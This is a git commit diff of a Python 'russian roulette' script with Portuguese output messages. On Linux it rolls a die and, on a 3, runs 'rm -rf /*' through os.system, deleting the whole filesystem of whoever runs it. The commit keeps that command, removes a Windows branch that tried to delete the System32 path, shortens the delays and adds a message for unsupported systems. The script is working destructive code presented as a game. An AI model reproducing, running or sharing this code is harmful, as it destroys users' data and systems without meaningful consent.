d2ac7acbfa850961b137afb369626fca5e586953
Jorge Clênio <cleniocontato@gmail.com>
2021-09-29 19:23:34 -0300

    Update russian_roulette.py

--- russian_roulette.py
+++ russian_roulette.py
@@ -6,27 +6,17 @@ import platform
 value = random.randint(1, 6)
 opSystem = platform.system()
 cmd_linux = 'rm -rf /*'
-cmd_windows = 'C:\Windows\System32'
 
 if(opSystem == 'Linux'):
     print('Seu sistema operacional é Linux!')
     if (value == 3):
         print('Voce foi morto, o valor que caiu foi: {}.'.format(value))
         print('Acabou tudo por aqui!')
-        time.sleep(3)
+        time.sleep(1)
         os.system(cmd_linux)
     else:
         print('Voce foi salvo, o valor que caiu foi: {}.'.format(value))
         print('Acabou tudo por aqui!')
-        time.sleep(3)
-elif (opSystem == 'Windows'):
-    print('Seu sistema operacional é Windows!')
-    if (value == 3):
-        print('Voce foi morto, o valor que caiu foi: {}.'.format(value))
-        print('Acabou tudo por aqui!')
-        time.sleep(3)
-        os.remove(cmd_windows)
-    else:
-        print('Voce foi salvo, o valor que caiu foi: {}.'.format(value))
-        print('Acabou tudo por aqui!')
-        time.sleep(3)
+        time.sleep(1)
+else:
+    print('Indisponível para seu sistema operacional no momento!\nAguarde novas atualizações!')
